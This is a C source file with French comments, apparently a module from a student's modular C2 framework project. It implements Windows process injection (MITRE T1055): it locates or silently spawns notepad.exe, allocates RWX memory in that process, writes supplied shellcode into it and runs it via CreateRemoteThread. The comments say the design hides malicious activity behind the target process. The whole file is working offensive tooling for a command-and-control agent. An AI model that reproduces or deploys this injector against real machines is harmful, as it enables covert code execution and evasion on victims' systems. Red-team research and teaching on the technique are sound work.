/*
 * ============================================================
 *  process_injection.c — Injection de shellcode (T1055)
 *
 *  Technique 4 : Classic Process Injection
 *  MITRE ATT&CK : T1055.001 / T1055.002
 *
 *  Pipeline d'exécution :
 *    1. Recherche d'un processus cible (par nom dans args, ou notepad.exe)
 *    2. Si introuvable → spawn notepad.exe en arrière-plan
 *    3. OpenProcess(PROCESS_ALL_ACCESS)
 *    4. VirtualAllocEx — alloue une région RWX dans le processus cible
 *    5. WriteProcessMemory — copie le shellcode dans le processus cible
 *    6. CreateRemoteThread — crée un thread dans le processus cible
 *    7. WaitForSingleObject (timeout 15 s)
 *    8. Nettoyage handles + rapport
 *
 *  Différence vs Shellcode Loader (T1059) :
 *    - T1059 : exécution dans le processus AGENT (in-process)
 *    - T1055 : exécution dans un processus DISTANT (cross-process)
 *    - T1055 est plus furtif car l'activité malveillante est
 *      attribuée au processus cible (notepad.exe), pas à l'agent
 *
 *  Limitation : la récupération de sortie nécessite IPC (pipe nommé).
 *  Cette implémentation retourne un message de statut uniquement.
 *  Pour capturer la sortie d'un shellcode "Beacon-aware" injecté,
 *  utiliser un pipe nommé partagé (extension future).
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "platform.h"
#include "process_injection.h"
#include "beacon_compatibility.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================
 *  IMPLÉMENTATION WINDOWS
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <tlhelp32.h>

/* Timeout attente du thread injecté (ms) */
#define INJ_TIMEOUT_MS      15000

/* Processus cible par défaut si non spécifié dans args */
#define INJ_DEFAULT_TARGET  "notepad.exe"

/* ── Erreur rapide ──────────────────────────────────────────── */
static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = _strdup(msg);
    return r;
}

/* ── Recherche d'un PID par nom de processus ────────────────── */
static DWORD find_process_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD found_pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                found_pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found_pid;
}

/* ── Spawn d'un processus cible en arrière-plan ─────────────── */
static DWORD spawn_target(const char *exe_name) {
    STARTUPINFOA        si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    /* Construire le chemin complet depuis System32 */
    char path[MAX_PATH] = {0};
    GetSystemDirectoryA(path, sizeof(path));
    strncat(path, "\\", sizeof(path) - strlen(path) - 1);
    strncat(path, exe_name, sizeof(path) - strlen(path) - 1);

    printf("[INJ] Spawn de '%s'...\n", path);
    fflush(stdout);

    BOOL ok = CreateProcessA(
        path,
        NULL,                   /* ligne de commande */
        NULL, NULL,             /* SECURITY_ATTRIBUTES */
        FALSE,                  /* héritage handles */
        CREATE_NO_WINDOW,       /* pas de fenêtre console */
        NULL,                   /* environnement hérité */
        NULL,                   /* répertoire courant hérité */
        &si, &pi
    );
    if (!ok) {
        printf("[INJ] Spawn échoué (err %lu)\n", (unsigned long)GetLastError());
        return 0;
    }

    DWORD pid = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Laisser le processus s'initialiser */
    Sleep(500);
    printf("[INJ] PID spawné: %lu\n", (unsigned long)pid);
    fflush(stdout);
    return pid;
}

/* ============================================================
 *  inject_execute — point d'entrée public
 * ============================================================ */
module_result_t inject_execute(
    const unsigned char *sc_bytes, size_t sc_size,
    const unsigned char *args,     size_t args_len
) {
    module_result_t result = {0};

    /* ── 1. Validation du shellcode ─────────────────────────── */
    if (!sc_bytes || sc_size < 4) {
        printf("[INJ] ERREUR: shellcode invalide (%zu bytes)\n", sc_size);
        return make_error("[INJ] Shellcode invalide");
    }

    printf("[INJ] ── Process Injection (T1055) ───────────────────\n");
    printf("[INJ] Shellcode : %zu bytes\n", sc_size);
    fflush(stdout);

    /* ── 2. Déterminer le processus cible ───────────────────── *
     * Si args contient un nom de processus (BeaconData), l'utiliser.
     * Sinon : notepad.exe par défaut.                           */
    char target_name[MAX_PATH] = {0};

    if (args && args_len >= 5) {
        /* Lire premier champ BeaconData : [4B LE len][bytes] */
        int name_len = (int)(
            ((unsigned char)args[0]      ) |
            ((unsigned char)args[1] <<  8) |
            ((unsigned char)args[2] << 16) |
            ((unsigned char)args[3] << 24)
        );
        if (name_len > 0 && name_len < (int)sizeof(target_name) &&
            (size_t)(4 + name_len) <= args_len) {
            memcpy(target_name, args + 4, (size_t)name_len);
        }
    }

    if (target_name[0] == '\0')
        strncpy(target_name, INJ_DEFAULT_TARGET, sizeof(target_name) - 1);

    printf("[INJ] Cible    : %s\n", target_name);
    fflush(stdout);

    /* ── 3. Trouver ou spawner le processus cible ───────────── */
    DWORD pid = find_process_by_name(target_name);
    BOOL  spawned = FALSE;

    if (!pid) {
        printf("[INJ] Processus '%s' introuvable → spawn...\n", target_name);
        fflush(stdout);
        pid = spawn_target(target_name);
        if (!pid)
            return make_error("[INJ] Impossible de trouver/spawner le processus cible");
        spawned = TRUE;
    } else {
        printf("[INJ] Processus '%s' trouvé → PID=%lu\n",
               target_name, (unsigned long)pid);
        fflush(stdout);
    }

    /* ── 4. Ouvrir le processus cible ───────────────────────── */
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE, pid
    );
    if (!hProc) {
        printf("[INJ] ERREUR: OpenProcess(PID=%lu) échoué (err %lu)\n",
               (unsigned long)pid, (unsigned long)GetLastError());
        return make_error("[INJ] OpenProcess échoué");
    }
    printf("[INJ] OpenProcess(PID=%lu) → %p\n",
           (unsigned long)pid, (void *)hProc);
    fflush(stdout);

    /* ── 5. Allouer mémoire RWX dans le processus cible ────── */
    LPVOID remote_base = VirtualAllocEx(
        hProc,
        NULL,
        sc_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if (!remote_base) {
        printf("[INJ] ERREUR: VirtualAllocEx(%zu) échoué (err %lu)\n",
               sc_size, (unsigned long)GetLastError());
        CloseHandle(hProc);
        return make_error("[INJ] VirtualAllocEx échoué");
    }
    printf("[INJ] VirtualAllocEx RWX @ %p dans PID=%lu\n",
           remote_base, (unsigned long)pid);
    fflush(stdout);

    /* ── 6. Écrire le shellcode dans le processus cible ─────── */
    SIZE_T bytes_written = 0;
    BOOL wpm_ok = WriteProcessMemory(
        hProc,
        remote_base,
        sc_bytes,
        sc_size,
        &bytes_written
    );
    if (!wpm_ok || bytes_written != sc_size) {
        printf("[INJ] ERREUR: WriteProcessMemory échoué (écrit %zu/%zu)\n",
               (size_t)bytes_written, sc_size);
        VirtualFreeEx(hProc, remote_base, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return make_error("[INJ] WriteProcessMemory échoué");
    }
    printf("[INJ] WriteProcessMemory: %zu bytes écrits @ %p\n",
           (size_t)bytes_written, remote_base);
    fflush(stdout);

    /* ── 7. Créer un thread distant ─────────────────────────── */
    HANDLE hThread = CreateRemoteThread(
        hProc,
        NULL,               /* SECURITY_ATTRIBUTES */
        0,                  /* stack size (défaut) */
        (LPTHREAD_START_ROUTINE)remote_base,
        NULL,               /* paramètre du thread */
        0,                  /* CREATE_FLAGS */
        NULL                /* thread id */
    );
    if (!hThread) {
        printf("[INJ] ERREUR: CreateRemoteThread échoué (err %lu)\n",
               (unsigned long)GetLastError());
        VirtualFreeEx(hProc, remote_base, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return make_error("[INJ] CreateRemoteThread échoué");
    }
    printf("[INJ] CreateRemoteThread → %p dans PID=%lu\n",
           (void *)hThread, (unsigned long)pid);
    printf("[INJ] Attente thread (timeout=%d ms)...\n", INJ_TIMEOUT_MS);
    fflush(stdout);

    /* ── 8. Attente avec timeout ────────────────────────────── */
    DWORD wait_res  = WaitForSingleObject(hThread, INJ_TIMEOUT_MS);
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    CloseHandle(hThread);
    CloseHandle(hProc);

    const char *wait_str = (wait_res == WAIT_OBJECT_0) ? "terminé" : "TIMEOUT";
    printf("[INJ] Thread %s — exit_code=%lu\n",
           wait_str, (unsigned long)exit_code);
    printf("[INJ] Note: mémoire distante conservée dans PID=%lu\n",
           (unsigned long)pid);
    fflush(stdout);

    /* ── 9. Construction du résultat ────────────────────────── */
    char msg[512];
    snprintf(msg, sizeof(msg),
             "[INJ] T1055 — PID=%lu (%s) | base_remote=%p | "
             "%zu bytes | exit=%lu | %s%s",
             (unsigned long)pid,
             target_name,
             remote_base,
             sc_size,
             (unsigned long)exit_code,
             wait_str,
             spawned ? " [processus spawné]" : "");

    result.data = (unsigned char *)malloc(strlen(msg) + 1);
    if (result.data) {
        memcpy(result.data, msg, strlen(msg) + 1);
        result.data_len = strlen(msg);
    }
    result.status = (wait_res == WAIT_OBJECT_0) ? 0 : -1;
    return result;
}

/* ============================================================
 *  STUB LINUX — non supporté
 * ============================================================ */
#else

module_result_t inject_execute(
    const unsigned char *sc_bytes, size_t sc_size,
    const unsigned char *args,     size_t args_len
) {
    (void)sc_bytes; (void)sc_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = strdup("[INJ] Process injection non supporté sur Linux");
    return r;
}

#endif /* PLATFORM_WINDOWS */
